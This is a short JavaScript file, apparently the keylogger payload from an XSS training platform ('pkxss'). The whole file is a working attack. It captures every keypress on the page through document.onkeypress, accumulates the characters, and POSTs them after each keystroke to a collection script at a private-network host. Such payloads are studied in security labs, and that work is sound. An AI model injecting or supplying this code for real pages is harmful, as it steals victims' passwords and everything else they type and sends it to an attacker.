/**
 * Created by runner on 2018/7/8.
 */

function createAjax(){
    var request=false;
    if(window.XMLHttpRequest){
        request=new XMLHttpRequest();
        if(request.overrideMimeType){
            request.overrideMimeType("text/xml");
        }

    }else if(window.ActiveXObject){

        var versions=['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Msxml2.XMLHTTP.7.0','Msxml2.XMLHTTP.6.0','Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];
        for(var i=0; i<versions.length; i++){
            try{
                request=new ActiveXObject(versions[i]);
                if(request){
                    return request;
                }
            }catch(e){
                request=false;
            }
        }
    }
    return request;
}

var ajax=null;
var xl="datax=";

function onkeypress() {
    var realkey = String.fromCharCode(event.keyCode);
    xl+=realkey;
    show();
}

document.onkeypress = onkeypress;

function show() {
    ajax = createAjax();
    ajax.onreadystatechange = function () {
        if (ajax.readyState == 4) {
            if (ajax.status == 200) {
                var data = ajax.responseText;
            } else {
                alert("页面请求失败");
            }
        }
    }

    var postdate = xl;
    ajax.open("POST", "http://192.168.1.15/pkxss/rkeypress/rkserver.php",true);
    ajax.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    ajax.setRequestHeader("Content-length", postdate.length);
    ajax.setRequestHeader("Connection", "close");
    ajax.send(postdate);
}